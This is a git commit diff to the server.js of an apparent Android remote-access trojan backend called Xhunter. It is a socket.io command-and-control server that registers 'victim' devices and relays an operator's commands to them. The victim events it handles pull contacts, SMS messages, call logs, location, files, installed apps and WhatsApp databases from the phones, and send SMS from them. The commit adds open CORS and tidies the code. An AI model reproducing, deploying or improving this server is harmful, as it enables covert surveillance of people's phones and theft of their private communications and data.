59c12ede55b6b666d2c1fca6daa4eabfbe926f7a
issa261 <68721191+issa261@users.noreply.github.com>
2025-09-19 00:00:23 +0300

    Update server.js

--- server.js
+++ server.js
@@ -2,10 +2,11 @@ const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
 const path = require('path');
+const cors = require('cors');
 
 const app = express();
 const server = http.createServer(app);
-const io = new Server(server, { maxHttpBufferSize: 1e8 });
+const io = new Server(server, { maxHttpBufferSize: 1e8, cors: { origin: "*", methods: ["GET","POST"] } });
 
 const port = process.env.PORT || 8080;
 
@@ -16,19 +17,22 @@ let deviceList = {};
 
 const log = (msg) => console.log(`[LOG] ${msg}`);
 
-// واجهات الويب
+// تمكين CORS
+app.use(cors());
 app.use(express.static(path.join(__dirname, 'public')));
-app.get('/',(req,res)=> res.send('Welcome to Xhunter Backend Server!!'));
+app.get('/', (req,res)=> res.send('Welcome to Xhunter Backend Server!!'));
 
 server.listen(port, () => log(`Server running on port ${port}`));
 
 io.on('connection', (socket) => {
+  // المدير
   socket.on('adminJoin', () => {
     adminSocketId = socket.id;
     Object.values(victimData).forEach(d => socket.emit('join', d));
     log(`Admin connected: ${socket.id}`);
   });
 
+  // العميل
   socket.on('join', (device) => {
     victimList[device.id] = socket.id;
     victimData[device.id] = { ...device, socketId: socket.id };
@@ -38,6 +42,7 @@ io.on('connection', (socket) => {
     log(`Device joined: ${device.id}`);
   });
 
+  // طلبات المدير
   socket.on('request', (d) => {
     const { to, action, data } = JSON.parse(d);
     if(victimList[to]) io.to(victimList[to]).emit(action, data);
@@ -45,18 +50,27 @@ io.on('connection', (socket) => {
   });
 
   const sendResponse = (action, data) => { if(adminSocketId) io.to(adminSocketId).emit(action, data); };
-  const sendBinaryResponse = (action, data, callback) => { if(adminSocketId){ callback('success'); io.to(adminSocketId).emit(action,data); } };
+  const sendBinaryResponse = (action, data, callback) => { if(adminSocketId){ if(callback) callback('success'); io.to(adminSocketId).emit(action,data); } };
 
-  const victimEvents = ['getDir','getInstalledApps','getContacts','sendSMS','getCallLog','previewImage','getSMS','getLocation','download','downloadWhatsappDatabase','openUrl','downloadFile'];
+  const victimEvents = ['getDir','getInstalledApps','getContacts','sendSMS','getCallLog','previewImage','getSMS','getLocation','download','downloadWhatsappDatabase'];
+
   victimEvents.forEach(ev => {
-    socket.on(ev, (data, callback) => { if(callback) sendBinaryResponse(ev,data,callback); else sendResponse(ev,data); });
+    socket.on(ev, (data, callback) => {
+      if(callback) sendBinaryResponse(ev,data,callback);
+      else sendResponse(ev,data);
+    });
   });
 
   socket.on('disconnect', () => {
     if(socket.id === adminSocketId) adminSocketId = null;
     else {
       sendResponse('disconnectClient', socket.id);
-      Object.keys(victimList).forEach(k => { if(victimList[k] === socket.id){ delete victimList[k]; delete victimData[k]; } });
+      Object.keys(victimList).forEach(k => {
+        if(victimList[k] === socket.id){
+          delete victimList[k];
+          delete victimData[k];
+        }
+      });
     }
     log(`Socket disconnected: ${socket.id}`);
   });
